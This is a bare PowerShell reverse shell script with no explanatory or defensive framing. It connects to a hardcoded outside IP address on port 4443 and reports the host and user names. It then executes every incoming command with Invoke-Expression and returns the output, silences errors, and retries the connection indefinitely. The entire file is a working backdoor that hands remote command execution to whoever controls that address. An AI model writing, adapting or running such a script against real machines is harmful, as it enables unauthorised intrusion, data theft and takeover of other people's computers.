param(
    [string]$IP = "144.172.65.153",
    [int]$Port = 4443,
    [int]$ReconnectDelay = 5,
    [int]$KeepAliveInterval = 10
)

$ErrorActionPreference = 'SilentlyContinue'

while ($true) {  # Infinite loop - keeps trying forever
    $client = $null
    $stream = $null
    $writer = $null
    $reader = $null
    
    try {
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)
        
        $computerName = $env:COMPUTERNAME
        $userName = $env:USERNAME
        $banner = [string]::Concat("`n[+] Connected`n[+] Host: ", $computerName, "`n[+] User: ", $userName, "`n`n")
        $writer.WriteLine($banner)
        
        while ($client.Connected) {
            $currentPath = (Get-Location).Path
            $promptText = [string]::Concat("PS ", $currentPath, "> ")
            $writer.Write($promptText)
            
            $command = $reader.ReadLine()
            
            if ($command) {
                $commandLower = $command.ToLower().Trim()
                
                if ($commandLower -eq "exit" -or $commandLower -eq "quit") {
                    break
                }
                
                try {
                    $result = Invoke-Expression $command 2>&1 | Out-String
                    if ($result) {
                        $writer.WriteLine($result)
                    }
                    else {
                        $writer.WriteLine("")
                    }
                }
                catch {
                    $errorText = $_.Exception.Message
                    $writer.WriteLine($errorText)
                }
            }
        }
    }
    catch {
        # Connection failed - wait and retry indefinitely
        Start-Sleep -Seconds $ReconnectDelay
    }
    finally {
        if ($writer) {
            try { $writer.Close() } catch {}
            try { $writer.Dispose() } catch {}
        }
        if ($reader) {
            try { $reader.Close() } catch {}
            try { $reader.Dispose() } catch {}
        }
        if ($stream) {
            try { $stream.Close() } catch {}
            try { $stream.Dispose() } catch {}
        }
        if ($client) {
            try { $client.Close() } catch {}
            try { $client.Dispose() } catch {}
        }
    }
}
